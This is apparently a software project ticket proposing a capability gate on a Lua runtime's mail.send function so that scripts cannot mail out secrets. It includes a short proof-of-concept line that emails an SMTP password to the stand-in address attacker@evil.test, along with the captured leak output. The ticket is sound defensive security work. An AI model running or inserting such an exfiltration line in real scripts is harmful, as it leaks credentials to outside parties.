---
id: TKT-JVHSOZ
type: ticket
title: Capability-gate mail.send like http and ai
kind: enhancement
priority: high
effort: s
status: backlog
---

## Description

`mail.send` is registered on every Lua runtime with no capability gate, unlike
`http.*` and `ai.*` which are gated precisely to prevent exfiltration via
outbound traffic (TKT-YH52OM).

Demonstrated: a runtime with a `secrets` grant and ZERO outbound capabilities
sends the secret to an attacker-chosen address.

```lua
assert(http == nil, "no http capability")
assert(ai == nil, "no ai capability")
mail.send{to = "attacker@evil.test", subject = "x", text = rela.secrets.smtp_password}
```

→ `LEAKED to=[attacker@evil.test] body="hunter2"`

`rela.secrets` is bound on the same runtime as `mail.send`
(`internal/lua/runtime.go:938` vs `:831`), so pairing them needs no privilege
the script does not already hold.

GitHub issue #1459. Source: IB-review rela#1458. Severity: moderate.

**Violated requirement**: CONTROL-8-03 (access limited to what is functionally
necessary) and CONTROL-5-14 (rules required for all transfer facilities;
mitigates RISK-011, data leak via unapproved sending).

## Why the existing rationale does not cover it

`internal/lua/mail.go:12-30` argues for unconditional registration, and the
argument is good — but it answers REGISTRATION ERGONOMICS, not AUTHORIZATION:

> mail.send is not a capability the script holds; it is a service the PROJECT
> either has or has not configured.

That establishes the TRANSPORT is operator config (`.rela/mail.yaml`, the same
audited tier as `acl.yaml`). It does not establish that any given script may
reach it.

The operator asymmetry is the point. An unexpected `mail` capability on a
500-line script STANDS OUT in a config file an operator reviews. The same reach
buried inside that script's code does not. That is exactly why `http` and `ai`
are gated, and the argument transfers unchanged.

## Scope

IN:
- `Mail` field on `lua.Capabilities`, alongside `HTTP` and `AI`.
- `luaMailSend` returns a typed `denied` error without the grant.
- Binding stays registered unconditionally — the feature-detection ergonomics
the current doc argues for are CORRECT and must be preserved. The two concerns
are separable: always present, refuses to send.
- Startup warning naming actions that call `mail.send` without the grant, so an
operator upgrading learns from a log line rather than from a digest that
silently stopped.

OUT:
- Backwards compatibility. Explicitly waived by the project owner: the gate
defaults closed and existing projects must grant it.
- Recipient constraints — separate ticket.

## The circularity to handle

`internal/mail/config.go:183` builds `lua.Capabilities{HTTP: c.HTTP, AI: false,
WriteFile: false, ...}` for mail's OWN send-script runtime. That one needs
`Mail: true` hard-wired, or the runtime whose entire job is sending mail cannot.

It is the one place the gate cannot apply, and the code must SAY so rather than
leave it to be rediscovered. Note the existing comment there already hard-wires
`AI: false` deliberately, with a stated reason — follow that pattern.

## Verification

The probe above is the acceptance test, inverted: with the gate in place and no
`Mail` grant, `mail.send` must return a typed denial and the sender must record
nothing. With the grant, it must send.

Mutation-check both directions — a gate that always denies passes the negative
test and breaks every legitimate send.
